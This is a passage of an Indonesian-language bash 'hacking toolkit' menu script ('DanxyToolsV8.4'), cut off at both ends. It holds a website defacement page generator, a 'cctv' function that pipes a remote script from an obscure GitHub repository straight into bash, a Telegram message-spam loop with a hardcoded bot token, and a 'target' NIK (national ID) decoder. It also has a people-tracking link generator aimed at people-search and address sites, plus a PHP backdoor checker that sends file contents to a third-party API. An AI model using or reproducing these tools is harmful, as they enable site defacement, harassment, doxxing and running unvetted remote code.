                    echo -e "${RED}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
                
                    echo
                    # Coba tampilkan JSON dengan jq untuk format rapi
                    if command -v jq &> /dev/null; then
                        exiftool -json "$file" | jq .
                    else
                        # Fallback ke plain text jika jq tidak terinstal
                        exiftool "$file"
                    fi
                    echo
                    echo -e "${BLUE}TEKAN ENTER UNTUK KEMBALI KE MENU${RESET}"
                    read -r
                else
                    echo -e "${RED}Silakan muat file terlebih dahulu (Opsi 1).${RESET}"
                    sleep 2
                fi
                ;;
            5)
                break
                ;;
            *)
                echo -e "${RED}Pilihan tidak valid. Silakan coba lagi.${RESET}"
                sleep 1
                ;;
        esac
    done
}




Generator_Deface() {
# ---------- WARNA ----------
readonly NC='\033[0m'
readonly RED='\033[38;5;196m'
readonly GRN='\033[38;5;82m'
readonly YLW='\033[38;5;226m'
readonly BLU='\033[38;5;39m'
readonly MAG='\033[38;5;201m'
readonly CYN='\033[38;5;51m'
readonly WHT='\033[38;5;255m'

safe_input(){
  local prompt="$1" default="$2"
  printf "${BLU}%s${NC}" "$prompt" >&2
  read -r val < /dev/tty
  printf '%s' "${val:-$default}"
}

header(){
  clear
  echo -e "${RED}
┌────────────────────────────────────────────────────┐
│ ██████╗░███████╗███████╗░██████╗░███████╗███╗░░██╗ │
│ ██╔══██╗██╔════╝██╔════╝██╔════╝░██╔════╝████╗░██║ │
│ ██║░░██║█████╗░░█████╗░░██║░░██╗░█████╗░░██╔██╗██║ │
${WHT}│ ██║░░██║██╔══╝░░██╔══╝░░██║░░╚██╗██╔══╝░░██║╚████║ │
│ ██████╔╝███████╗██║░░░░░╚██████╔╝███████╗██║░╚███║ │
│ ╚═════╝░╚══════╝╚═╝░░░░░░╚═════╝░╚══════╝╚═╝░░╚══╝ │
└────────────────────────────────────────────────────┘
│     ${YLW}▶ ${GRN}DEFACE HTML GENERATOR BY TOOLS V8.4${YLW} ◀${WHT}        │
└────────────────────────────────────────────────────┘${NC}\n\n"
}

generate_flow(){
  header
  bg_url=$(safe_input " [ ? ] URL Background (ENTER = hitam polos): ")
  logo=$(safe_input " [ ? ] URL Logo (ENTER = tanpa logo): ")
  judul=$(safe_input " [ ? ] Judul H1 (ENTER = tanpa judul): ")
  pesan=$(safe_input " [ ? ] Pesan utama (ENTER = tanpa pesan): ")
  lagu=$(safe_input " [ ? ] URL Musik mp3 (ENTER = tanpa audio): ")
  fsize=$(safe_input " [ ? ] Font-size pesan px (ENTER = 28px): ")
  fcolor=$(safe_input " [ ? ] Warna font (ENTER = #00ff00): ")
  greets=$(safe_input " [ ? ] Greetz, pisah koma (ENTER = tanpa greetz): ")
  outfile=$(safe_input " [ ? ] Nama file output (ENTER = index.html): ")
  outfile=${outfile:-index.html}

  judul=${judul:-Hacked by D4NXPLO1t}
  pesan=${pesan:-Your security has been owned!}
  fsize=${fsize:-28px}
  fcolor=${fcolor:-#00ff00}

  {
    cat << HTML
<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>${judul}</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{
      font-family:'Orbitron',monospace;height:100vh;display:flex;
      flex-direction:column;align-items:center;justify-content:center;
      text-align:center;background:${bg_url:+url(\'$bg_url\') no-repeat center/cover fixed;}${bg_url:-#000};
      color:${fcolor}
    }
    h1{font-size:3.5rem;text-shadow:0 0 15px red,0 0 30px red;margin-bottom:15px}
    #pesan{font-size:${fsize};text-shadow:0 0 10px ${fcolor};margin-bottom:25px;color:#ffffff}
    audio{margin-bottom:30px}
    #greetz{position:fixed;bottom:0;left:0;width:100%;background:rgba(0,0,0,.8);color:lime;padding:8px 0;font-size:1.1rem}
  </style>
</head>
<body>
HTML
    [[ -n "$logo" ]] && echo "  <img src=\"$logo\" style=\"max-width:300px;margin-bottom:25px;filter:drop-shadow(0 0 8px ${fcolor})\">"
    echo "  <h1>$judul</h1>"
    echo "  <p id=\"pesan\">$pesan</p>"
    if [[ -n "$lagu" ]]; then
      echo "  <audio controls autoplay loop>"
      echo "    <source src=\"$lagu\" type=\"audio/mpeg\">"
      echo "    Browser Anda tidak mendukung audio HTML5."
      echo "  </audio>"
    fi
    if [[ -n "$greets" ]]; then
      echo "  <div id=\"greetz\"><marquee behavior=\"scroll\" direction=\"left\">Greetz: $greets</marquee></div>"
    fi
    echo "</body></html>"
  } > "$outfile"
  
mv -f "$outfile" "/sdcard/${outfile}" 2>/dev/null ||
cp -f "$outfile" "/sdcard/${outfile}" 2>/dev/null

printf "\n${GRN} [✓] File deface berhasil dibuat => /sdcard/%s${NC}\n\n" "$outfile"
}

generate_flow
}

cctv() {
  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/cctv.sh")
}


########################################################################

crypto_check() {
  curl -s "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd" | jq .
  read -p "TEKAN ENTER UNTUK KEMBALI"
}

spin() {
    local pid=$1
    local delay=0.25
    echo -e "${GREEN}"
    local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

    while kill -0 "$pid" 2>/dev/null; do
        for frame in "${spinner[@]}"; do
            printf "\r[%s] Sedang memproses..." "$frame"
            sleep "$delay"
        done
    done
    printf "\r[✓] Selesai!                  \n"
}

ai_chat() {
    clear
    spasi
    echo -e "${RED}
░█████╗░██╗░░██╗░█████╗░████████╗░░░░█████╗░██╗
██╔══██╗██║░░██║██╔══██╗╚══██╔══╝░░░██╔══██╗██║
██║░░╚═╝███████║███████║░░░██║░░░░░░███████║██║
${WHITE}██║░░██╗██╔══██║██╔══██║░░░██║░░░░░░██╔══██║██║
╚█████╔╝██║░░██║██║░░██║░░░██║░░░██╗██║░░██║██║
░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝╚═╝
${GREEN}[ ✓ ] MENGOBROL DENGAN AI PINTAR${NC}"
    echo "CARA KELUAR DARI AI CHAT: ketik Q lalu ENTER"
    echo
    echo "DanxyToolsV8.4 AI Chat"
    echo

    while true; do
        echo -n "Pertanyaan Kamu: "
        read -r pertanyaan

        case "$pertanyaan" in
            [qQ])
                echo
                echo "Keluar dari chat..."
                sleep 1
                kembali_ke_menu
                return
                ;;
            "")
                echo -e "${RED}[!] Pertanyaan tidak boleh kosong${NC}"
                echo
                continue
                ;;
        esac

        # --- tangkap pertanyaan tentang nama ---
        if [[ "${pertanyaan,,}" =~ (siapa nama|namamu siapa|who are you) ]]; then
            echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
            echo -e "${CYAN}DanxyToolsV8.4:${NC} nama saya DanxyTools siap membantu kamu"
            echo
            continue
        fi

        # encode query
        q_enc=$(printf '%s' "$pertanyaan" | jq -sRr @uri)

        # --- retry 3 kali bila server 5xx ---
        for attempt in {1..3}; do
            temp_file=$(mktemp)
            http_code=$(curl -s -w "%{http_code}" -o "$temp_file" \
                        "https://api.fikmydomainsz.xyz/ai/nowchat?q=$q_enc" 2>/dev/null)

            if [[ "$http_code" -eq 200 ]]; then
                jawaban=$(jq -r '.jawaban // .answer // "Maaf, tidak ada jawaban."' "$temp_file" 2>/dev/null)
                rm -f "$temp_file"
                [[ -z "$jawaban" ]] && jawaban="Maaf, tidak ada jawaban."

                echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
                echo -e "${CYAN}DanxyToolsV8.4:${NC} $jawaban"
                echo
                break
            else
                rm -f "$temp_file"
                if [[ $attempt -lt 3 ]]; then
                    echo -e "${YELLOW}[...] Server sibuk (HTTP $http_code), coba lagi... ($attempt/3)${NC}"
                    sleep 2
                else
                    echo -e "${RED}[!] Server tidak dapat dijangkau (HTTP $http_code).${NC}"
                    echo -e "${RED}    Silakan coba beberapa saat lagi atau ketik 'q' untuk kembali.${NC}"
                    echo
                fi
            fi
        done
    done
}




short_url() {
clear
spasi
echo -e "${GREEN}
░██████╗██╗░░██╗░█████╗░██████╗░████████╗
██╔════╝██║░░██║██╔══██╗██╔══██╗╚══██╔══╝
╚█████╗░███████║██║░░██║██████╔╝░░░██║░░░
${RED}░╚═══██╗██╔══██║██║░░██║██╔══██╗░░░██║░░░
██████╔╝██║░░██║╚█████╔╝██║░░██║░░░██║░░░
╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░
${YELLOW}[ ✓ ] AYO SAMARKAN/PENDEKAN URL LINK KAMU"
    echo "Masukkan URL yang ingin dipendekkan: "
    read url
    if [[ -z "$url" ]]; then
        echo "[!] URL tidak boleh kosong"
        return
    fi

    temp_file=$(mktemp)
    curl -s "https://tinyurl.com/api-create.php?url=$url" > "$temp_file" &
    pid=$!
    spin $pid
    wait $pid

    short=$(cat "$temp_file")
    rm "$temp_file"

    if [[ -z "$short" ]]; then
        echo "[!] Gagal memendekkan URL"
    else
        echo "URL Asli    : $url"
        echo "URL Pendek  : $short"
    fi
}

spin() {
    local pid=$1
    local delay=0.25
    echo -e "${GREEN}"
    local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

    while kill -0 "$pid" 2>/dev/null; do
        for frame in "${spinner[@]}"; do
            printf "\r[%s] Sedang memproses..." "$frame"
            sleep "$delay"
        done
    done
    printf "\r[✓] Selesai!                  \n"
}

cheker_nik() {
    clear
    spasi
    echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀                  ⠀⣠⣶⡿⠟⠛⠛⠻⢿⣷⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠉⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⣤⣖⣿⣿⣿⣿⣒⡦⡀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⣴⣾⣿⡛⣿⣿⣿⣿⠛⣻⣷⣶⣄⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠿⠿⠛⠋⠙⠛⠿⠿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣷⡿⣿⣷⣄⡀⠀⣀⣴⣿⢟⣽⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠏⠙⠿⣿⣿⣌⠻⢿⣿⣿⡿⠟⣩⣾⣿⡿⠛⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠀⠀⠀⠀⠀⠙⠛⠳⠄⠀⠀⠀⠴⠛⠋⠁⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⢠⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣦⣀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡅⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⣀⣤⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat -p 0.7
    echo -e "${BG_RED}${YELLOW}CHECKER INFORMASI NIK${NC}"

    # Input NIK
    read -p "$(echo -e ${RED}Input\ NIK\ Target:\ ${NC})" nik

    # Validasi NIK
    if ! [[ $nik =~ ^[0-9]{16}$ ]]; then
        echo -e "${RED}ERROR! NIK Tidak Valid!${NC}"
    fi

    # Jalankan loading pura-pura (misalnya 3 detik) di background
    (sleep 3) &
    pid=$!
    spin $pid
    wait $pid

    # Ekstrak data
    tanggal="${nik:6:2}"
    bulan="${nik:8:2}"
    tahun="${nik:10:2}"
    prov="${nik:0:2}"
    kabkot="${nik:0:4}"
    kecamatan="${nik:0:6}"
    uniqcode="${nik:12:4}"

    # Jenis kelamin
    if ((10#$tanggal > 40)); then
        tanggal=$((10#$tanggal - 40))
        jeniskelamin="PEREMPUAN"
    else
        jeniskelamin="LAKI-LAKI"
    fi

    # Cek data.json
    if [[ ! -f "data.json" ]]; then
        echo -e "${RED}! Data Tidak Valid !${NC}"
        exit 1
    fi
    
    # Ambil data dari JSON
    provinsi=$(jq -r --arg p "$prov" '.provinsi[$p] // $p' data.json)
    kabupaten=$(jq -r --arg k "$kabkot" '.kabkot[$k] // $k' data.json)
    kecamatan_data=$(jq -r --arg kc "$kecamatan" '.kecamatan[$kc] // $kc' data.json)

    # Pecah kecamatan & kode pos
    if [[ "$kecamatan_data" == *"--"* ]]; then
        kecamatan_name="${kecamatan_data%%--*}"
        kode_pos="${kecamatan_data##*--}"
    else
        kecamatan_name="$kecamatan_data"
        kode_pos="N/A"
    fi

    # Output
    loading
    echo -e "${GREEN}!Tanggal Lahir: $tanggal/$bulan/$tahun${NC}"
    echo -e "${GREEN}!Jenis Kelamin: $jeniskelamin${NC}"
    echo -e "${GREEN}!Provinsi: $provinsi${NC}"
    echo -e "${GREEN}!Kab/Kota: $kabupaten${NC}"
    echo -e "${GREEN}!Kecamatan: $kecamatan_name${NC}"
    echo -e "${GREEN}!Kode Pos: $kode_pos${NC}"
    echo -e "${GREEN}!Uniqcode: $uniqcode${NC}"
}

spam_tg() {
    # Warna
    YELLOW='\033[1;33m'
    GREEN='\033[1;32m'
    RED='\033[1;31m'
    NC='\033[0m' # No Color

    # Token bot
    BOT_TOKEN="8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"

    clear
    spasi
    echo -e "${YELLOW}
▒█▀▀█ ▒█▀▀▀█ ▒█▀▀▀█ ▒█▀▄▀█ ░ ▀▀█▀▀ ▒█▀▀▀ ▒█░░░ ▒█▀▀▀ 
${RED}▒█▀▀▄ ▒█░░▒█ ▒█░░▒█ ▒█▒█▒█ ▄ ░▒█░░ ▒█▀▀▀ ▒█░░░ ▒█▀▀▀ 
▒█▄▄█ ▒█▄▄▄█ ▒█▄▄▄█ ▒█░░▒█ █ ░▒█░░ ▒█▄▄▄ ▒█▄▄█ ▒█▄▄▄
${GREEN}[ ✓ ] SPAM KE USER TELEGRAM${NC}"

    read -p "Masukkan ID Telegram Target: " chat_id
    if [[ -z "$chat_id" ]]; then
        echo -e "${RED}ID tidak boleh kosong!${NC}"
        return
    fi

    read -p "Masukkan Pesan: " pesan
    if [[ -z "$pesan" ]]; then
        echo -e "${RED}Pesan tidak boleh kosong!${NC}"
        return
    fi

    read -p "Jumlah Spam: " jumlah
    if ! [[ "$jumlah" =~ ^[0-9]+$ ]] || [[ "$jumlah" -le 0 ]]; then
        echo -e "${RED}Jumlah harus angka positif!${NC}"
        return
    fi

    read -p "Pakai jeda? (y/n): " use_delay
    if [[ "$use_delay" == "y" || "$use_delay" == "Y" ]]; then
        read -p "Masukkan jeda antar pesan (detik): " delay
        if ! [[ "$delay" =~ ^[0-9]+$ ]]; then
            echo -e "${RED}Delay harus angka!${NC}"
            return
        fi
    else
        delay=0
    fi

    echo -e "\n${YELLOW}Mulai spam...${NC}"

    for ((i=1; i<=jumlah; i++))
    do
        curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d "chat_id=${chat_id}" \
            -d "text=${pesan}" > /dev/null

        echo -e "[${i}/${jumlah}] Pesan terkirim."

        if [[ $delay -gt 0 ]]; then
            sleep "$delay"
        fi
    done

    echo -e "\n${GREEN}Selesai!${NC}"
}


track_nama() {
set -euo pipefail
# ---------- WARNA ----------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;94m'
CYAN='\033[0;96m'
NC='\033[0m' # no color
# ---------- FUNGSI ----------
url_encode() {
    # shell-friendly url-encode
    printf '%s' "$1" | jq -sRr @uri
}
print_section() {
    echo -e "\n${YELLOW}[∆] $1${NC}"
}
print_link() {
    echo -e "${BLUE}  •${NC} $1"
}
# ---------- INPUT ----------
clear
spasi
echo -e "${CYAN}
██╗░░░░░███████╗░█████╗░██╗░░██╗░██████╗██╗███╗░░██╗
██║░░░░░██╔════╝██╔══██╗██║░██╔╝██╔════╝██║████╗░██║
██║░░░░░█████╗░░███████║█████═╝░╚█████╗░██║██╔██╗██║
██║░░░░░██╔══╝░░██╔══██║██╔═██╗░░╚═══██╗██║██║╚████║
███████╗███████╗██║░░██║██║░╚██╗██████╔╝██║██║░╚███║
╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝" | lolcat -p 0.7
echo -e "===========================================================
  ${RED}LACAK NAMA – 70+ Search Points
  Cari jejak publik seseorang di berbagai mesin & platform${NC}
==========================================================="
read -rp "Masukkan nama lengkap: " NAMA_RAW
[[ -z "$NAMA_RAW" ]] && { echo "Nama tidak boleh kosong"; exit 1; }

NAMA=$(url_encode "$NAMA_RAW")
echo -e "\n${BLUE}[↓] Sedang mengumpulkan link pencarian untuk: ${YELLOW}$NAMA_RAW${NC} ..."
sleep 2

# ---------- BANK PENCARIAN ----------
# Gunakan array agar mudah ditambah/dikurangi
declare -a links

# 1. Google Dorks (10)

links+=(
"https://www.google.com/search?q=%22$NAMA%22"
"https://www.google.com/search?q=%22$NAMA%22+site:facebook.com"
"https://www.google.com/search?q=%22$NAMA%22+site:linkedin.com"
"https://www.google.com/search?q=%22$NAMA%22+site:twitter.com"
"https://www.google.com/search?q=%22$NAMA%22+site:instagram.com"
"https://www.google.com/search?q=%22$NAMA%22+site:github.com"
"https://www.google.com/search?q=%22$NAMA%22+site:tiktok.com"
"https://www.google.com/search?q=%22$NAMA%22+site:youtube.com"
"https://www.google.com/search?q=%22$NAMA%22+filetype:pdf"
"https://www.google.com/search?q=%22$NAMA%22+site:reddit.com"
)

# 2. Facebook (2)
links+=(
"https://www.facebook.com/public/$NAMA"
"https://www.facebook.com/search/people/?q=$NAMA"
)

# 3. LinkedIn (2)
links+=(
"https://www.linkedin.com/pub/dir/$NAMA"
"https://www.linkedin.com/search/results/people/?keywords=$NAMA"
)

# 4. Twitter (2)
links+=(
"https://twitter.com/search?q=%22$NAMA%22&src=typed_query"
"https://twitter.com/search-advanced?q=$NAMA"
)

# 5. Instagram (2)
links+=(
"https://www.instagram.com/$NAMA"
"https://www.picuki.com/search/$NAMA"
)

# 6. GitHub (4)
links+=(
"https://github.com/search?q=$NAMA&type=users"
"https://api.github.com/users/$NAMA"
"https://gist.github.com/search?q=$NAMA"
"https://commits.top/$NAMA.html"
)

# 7. TikTok (2)
links+=(
"https://www.tiktok.com/search?q=$NAMA"
"https://urlebird.com/search/$NAMA"
)

# 8. YouTube (2)
links+=(
"https://www.youtube.com/results?search_query=%22$NAMA%22"
"https://www.youtube.com/c/$NAMA"
)

# 9. Reddit (2)
links+=(
"https://www.reddit.com/search/?q=%22$NAMA%22"
"https://www.reddit.com/user/$NAMA"
)

# 10. Search-Engine Khusus Orang (15)
links+=(
"https://www.peekyou.com/$NAMA"
"https://pipl.com/search/?q=$NAMA"
"https://thatsthem.com/name/$NAMA"
"https://www.spokeo.com/$NAMA"
"https://www.whitepages.com/name/$NAMA"
"https://www.zabasearch.com/people/$NAMA"
"https://www.mylife.com/$NAMA"
"https://www.truthfinder.com/results/?name=$NAMA"
"https://www.beenverified.com/people/$NAMA"
"https://www.fastpeoplesearch.com/name/$NAMA"
"https://www.advancedbackgroundchecks.com/names/$NAMA"
"https://www.clustrmaps.com/person/$NAMA"
"https://www.searchpeoplefree.com/find/$NAMA"
"https://checkpeople.com/people/search/$NAMA"
"https://www.idcrawl.com/$NAMA"
)

# 11. Pencarian Gambar (4)
links+=(
"https://lens.google.com/uploadbyurl?url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
"https://yandex.com/images/search?rpt=imageview&url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
"https://tineye.com/search?url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
"https://images.bing.com/visualsearch"
)

# 12. Domain / Email / Username (6)
links+=(
"https://namechk.com/$NAMA"
"https://checkusernames.com/usercheck.php?target=$NAMA"
"https://whatsmyname.app"
"https://knowem.com/checkusernames.php?u=$NAMA"
"https://hunter.io/search/$NAMA"
"https://www.email-format.com/i/search/$NAMA"
)

# 13. Pencarian Nomor Telepon (3)
links+=(
"https://www.truecaller.com/search/$NAMA"
"https://sync.me/search/?q=$NAMA"
"https://www.numlookup.com/search/$NAMA"
)

# 14. Pencarian Alamat (3)
links+=(
"https://www.fastpeoplesearch.com/address/$NAMA"
"https://www.whitepages.com/address/$NAMA"
"https://www.addresssearch.com/result.php?name=$NAMA"
)

# 15. Pencarian Pekerjaan / Profesional (5)
links+=(
"https://angel.co/search?query=$NAMA"
"https://wellfound.com/u/$NAMA"
"https://stackoverflow.com/users/filter?search=$NAMA"
"https://dev.to/search?q=$NAMA"
"https://medium.com/search?q=$NAMA"
)

# 16. Pencarian Akademik (5)
links+=(
"https://scholar.google.com/scholar?q=%22$NAMA%22"
"https://www.researchgate.net/search.Search.html?query=$NAMA"
"https://academia.edu/search?utf8=✓&q=$NAMA"
"https://orcid.org/orcid-search/search?searchQuery=$NAMA"
"https://pubmed.ncbi.nlm.nih.gov/?term=%22$NAMA%22"
)

# 17. Pencarian Berita (3)
links+=(
"https://news.google.com/search?q=%22$NAMA%22"
"https://www.bing.com/news/search?q=%22$NAMA%22"
"https://duckduckgo.com/?q=%22$NAMA%22&iar=news"
)

# 18. Pencarian Karya Kreatif (3)
links+=(
"https://www.behance.net/search/projects/?search=$NAMA"
"https://dribbble.com/search/$NAMA"
"https://soundcloud.com/search?q=$NAMA"
)

# 19. Pencarian Blog / Situs Pribadi (3)
links+=(
"https://about.me/$NAMA"
"https://wordpress.com/search/$NAMA"
"https://wix.com/search/$NAMA"
)

# 20. Misc / Utility (3)
links+=(
"https://www.waybackmachine.org/*/https://*$NAMA*"
"https://publicwww.com/websites/%22$NAMA%22"
"https://boardreader.com/s/$NAMA.html"
)

# ---------- OUTPUT ----------
echo -e "\n${GREEN}[✓] 70+ link siap dibuka:${NC}"
idx=1
for l in "${links[@]}"; do
    echo -e "${GREEN}$idx.${NC} $l"
    ((idx++))
done

echo -e "\n${GREEN}[✓] Selesai. Salin / klik link di atas.${NC}"
}

checker_backdor_php() {
clear

# Tampilkan ASCII art
banner=$(cat << "EOF"
╔═══╦═══╦═╗─╔╦═╗╔═╦╗──╔╗
╚╗╔╗║╔═╗║║╚╗║╠╗╚╝╔╣╚╗╔╝║
─║║║║║─║║╔╗╚╝║╚╗╔╝╚╗╚╝╔╝
─║║║║╚═╝║║╚╗║║╔╝╚╗─╚╗╔╝
╔╝╚╝║╔═╗║║─║║╠╝╔╗╚╗─║║
╚═══╩╝─╚╩╝─╚═╩═╝╚═╝─╚╝
EOF
)
echo "$banner"
echo ""
echo "Selamat datang di AI Backdoor Scanner"
echo "---------------------------------------"
echo "Tool ini akan memeriksa file PHP apakah mengandung backdoor atau tidak."
echo "Silakan masukkan folder yang ingin diperiksa."
echo ""

# Minta input folder dari user
echo -e "${BG_RED}${YELLOW}CONTOH PATH: /storage/emulated/0/Folder1/Danxy"
read -rp "Masukkan path folder: " TARGET_DIR

# Cek apakah folder ada
if [[ ! -d "$TARGET_DIR" ]]; then
    echo "[!] Folder '$TARGET_DIR' tidak ditemukan!"
    exit 1
fi

# Variabel API
API_URL="https://xiex.my.id/api/ai/chat/completions"
API_KEY="ApiKey"
MODEL="brainxiex"
DEBUG_FILE="debug.txt"

FILES=($(find "$TARGET_DIR" -type f -name "*.php"))
TOTAL=${#FILES[@]}

echo "[*] Memulai analisis AI untuk file PHP..."
echo "=== DEBUG LOG ===" > "$DEBUG_FILE"

i=1
for FILE in "${FILES[@]}"; do
    echo ""
    echo "[#] ($i/$TOTAL) Memeriksa: $FILE"

    CONTENT=$(head -n 100 "$FILE")

    if [[ -z "$CONTENT" ]]; then
        echo "[?] $FILE -> kosong / tidak bisa dianalisis"
        echo -e "\n[$FILE] Kosong / tidak bisa dianalisis" >> "$DEBUG_FILE"
        ((i++))
        continue
    fi

    PROMPT=$(printf "Apakah kode PHP berikut berisi backdoor? Berikan jawaban singkat dan to the point:\n\n%s" "$CONTENT")

    JSON=$(jq -n \
        --arg model "$MODEL" \
        --arg apikey "$API_KEY" \
        --arg content "$PROMPT" \
        '{
            model: $model,
            apikey: $apikey,
            messages: [{role: "user", content: $content}]
        }') || {
        echo "[!] $FILE -> gagal membuat JSON (kemungkinan prompt terlalu panjang)"
        echo -e "\n[$FILE] ERROR saat membuat JSON" >> "$DEBUG_FILE"
        ((i++))
        continue
    }

    echo -e "\n=== [$FILE] ===" >> "$DEBUG_FILE"
    echo -e ">> JSON:\n$JSON" >> "$DEBUG_FILE"

    RESPONSE=$(curl -s -X POST "$API_URL" \
        -H "Content-Type: application/json" \
        -d "$JSON")

    echo -e ">> RESPONSE:\n$RESPONSE" >> "$DEBUG_FILE"

    RESULT=$(echo "$RESPONSE" | jq -r '.answer // .message.content // .choices[0].message.content // "Tidak ada respon dari AI"')

    if [[ "$RESULT" == *"apikey salah"* ]]; then
        echo "[+] $FILE -> hasil: apikey salah"
    elif [[ "$RESULT" == "null" || -z "$RESULT" ]]; then
        echo "[!] $FILE -> respons error dari server"
        echo "    ↳ Pesan server: $(echo "$RESPONSE" | jq -r '.message // .error // empty')"
    else
        echo "[+] $FILE -> hasil: $RESULT"
    fi

    sleep 5
    ((i++))
    done
echo -e "\n${GREEN}Selesai!${NC}"
}

ngl_spam() {
  clear
  spasi
  echo -e "${RED}
